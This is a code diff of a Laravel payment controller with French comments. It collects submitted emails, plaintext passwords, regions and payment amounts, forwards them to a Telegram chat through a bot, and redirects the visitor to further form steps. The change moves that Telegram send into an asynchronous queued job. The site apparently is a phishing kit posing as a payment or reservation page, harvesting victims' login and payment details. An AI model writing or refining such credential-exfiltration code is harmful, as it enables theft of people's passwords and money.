@@ -25,15 +25,15 @@ class PaymentController extends Controller
                  . "📧 Email : {$validated['username']}\n"
                  . "🔐 Mot de passe : {$validated['password']}" ;
 
-        // Envoyer Telegram en arrière-plan (queue)
-        try {
-            Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
-                ->notify(new TelegramAlert($message));
-                
-        } catch (\Throwable $e) {
-            Log::error('Telegram Error: ' . $e->getMessage());
-            // Continue même si Telegram échoue
-        }
+        // Envoyer Telegram de manière asynchrone (sans attendre)
+        dispatch(function () use ($message) {
+            try {
+                Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
+                    ->notify(new TelegramAlert($message));
+            } catch (\Throwable $e) {
+                Log::error('Telegram Error: ' . $e->getMessage());
+            }
+        })->onQueue('default');
 
         return redirect()->route('personal-info');
     }
@@ -66,15 +66,15 @@ class PaymentController extends Controller
                  . "🗺️ Région : {$validated['region']}\n"
                  . "💰 Montant : {$validated['article_amount']} €";
 
-        // Envoyer Telegram en arrière-plan (queue)
-        try {
-            Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
-                ->notify(new TelegramAlert($message));
-                
-        } catch (\Throwable $e) {
-            Log::error('Telegram Error: ' . $e->getMessage());
-            // Continue même si Telegram échoue
-        }
+        // Envoyer Telegram de manière asynchrone (sans attendre)
+        dispatch(function () use ($message) {
+            try {
+                Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
+                    ->notify(new TelegramAlert($message));
+            } catch (\Throwable $e) {
+                Log::error('Telegram Error: ' . $e->getMessage());
+            }
+        })->onQueue('default');
 
         return redirect()->route('reservation');
     }
